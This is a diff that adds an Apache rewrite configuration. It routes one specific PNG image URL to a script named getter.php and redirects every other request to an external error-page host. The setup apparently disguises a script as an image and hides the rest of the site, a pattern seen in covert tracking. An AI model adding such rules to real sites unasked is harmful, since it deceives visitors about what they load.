@@ -1,0 +1,4 @@
+RewriteEngine On
+
+RewriteRule ^/images/123908234.png$   /getter.php [NC,L]
+RewriteRule ^ http://error404.000webhost.com/ [L]
